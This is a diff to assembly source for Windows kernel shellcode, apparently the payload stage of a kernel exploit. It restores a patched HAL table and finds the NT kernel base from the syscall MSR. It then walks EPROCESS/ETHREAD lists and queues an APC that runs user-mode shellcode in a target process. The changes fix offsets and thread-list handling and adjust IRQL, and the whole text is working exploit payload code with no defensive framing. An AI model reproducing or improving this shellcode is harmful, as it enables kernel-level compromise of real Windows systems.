@@ -5,13 +5,13 @@
 
 ; shellcode data section offsets
 
-OFFSET_PEB_ADDR          EQU 0x0
-OFFSET_KAPC              EQU 0x8
-OFFSET_KAPC2             EQU 0x60
-OFFSET_SC_BASE_ADDR      EQU 0xC8
-OFFSET_HALPINTERRCONT    EQU 0xD0
-OFFSET_PHALPAPICREQ      EQU 0xD8
-OFFSET_NTENTRY           EQU 0xE0
+OFFSET_NTBASE            EQU 0x0
+OFFSET_PEB_ADDR          EQU 0x8
+OFFSET_KAPC              EQU 0x10
+OFFSET_KAPC2             EQU 0x68
+OFFSET_SC_BASE_ADDR      EQU 0xD0
+OFFSET_HALPINTERRCONT    EQU 0xD8
+OFFSET_PHALPAPICREQ      EQU 0xE0
 OFFSET_USERPAYLOAD       EQU 0xE8
 
 ; some hardcoded EPROCESS and ETHREAD field offsets. I think they're consistent on Win10?
@@ -64,7 +64,14 @@ _patch_back_hal_table:
     mov qword rbx, [r14 + OFFSET_PHALPAPICREQ]
     mov [rax], qword rbx
     sti
-    mov rax, [r14 + OFFSET_NTENTRY]
+
+    xor rcx, rcx
+    mov cr8, rcx
+    mov ecx, 0xc0000082
+    rdmsr
+    and eax, 0xFFFFF000
+    shl rdx, 0x20
+    add rax, rdx
 
 _find_nt_base:
     sub rax, 0x1000
@@ -72,7 +79,7 @@ _find_nt_base:
     jne _find_nt_base
     
     mov r15, rax
-    mov [r14 + OFFSET_NTENTRY], r15
+    mov [r14 + OFFSET_NTBASE], r15
 
 _get_current_eprocess:
     mov edi, HASH_PSGETCURRPROC
@@ -105,8 +112,8 @@ _found_target_process:
     call _call_nt_func
     mov [r14 + OFFSET_PEB_ADDR], rax
 
-    mov r9, [r13 + OFFSET_EPROCTHREADLIST]
-    mov r8, [r13 + OFFSET_EPROCTHREADLIST + 0x8]
+    mov r8, [r13 + OFFSET_EPROCTHREADLIST]
+    mov r9, [r13 + OFFSET_EPROCTHREADLIST + 0x8]
     sub r8, OFFSET_ETHREADTHREADLIST
     xor rsi, rsi
 
@@ -120,7 +127,7 @@ _find_good_thread:
 
 _find_good_thread_loop:
     cmp r8, r9
-    mov r9, [r9 + OFFSET_ETHREADTHREADLIST]
+    mov r9, [r9 + OFFSET_ETHREADTHREADLIST + 8]
     jne _find_good_thread
 
 _init_apc:
@@ -143,6 +150,8 @@ _insert_apc:
     lea rcx, [r14 + OFFSET_KAPC]
     mov edi, HASH_KEINSERTQUEUEAPC
     sub rsp, 0x20
+    mov rax, 0x5
+    mov cr8, rax
     call _call_nt_func
     add rsp, 0x20
 
@@ -259,7 +268,7 @@ _find_kernel32_dll_loop:
     mov r14, rax
 
 _alloc_mem:
-    mov r15, [rel _data_addr + OFFSET_NTENTRY]
+    mov r15, [rel _data_addr + OFFSET_NTBASE]
     xor eax, eax
     mov cr8, rax
     lea rdx, [rel _data_addr + OFFSET_SC_BASE_ADDR]
@@ -335,6 +344,7 @@ _user_shellcode:
     ret
 
 _data_addr:
+    db 'XXXXXXXX'
     db 'XXXXXXXX'
     db 'XXXXXXXX'
     db 'XXXXXXXX'
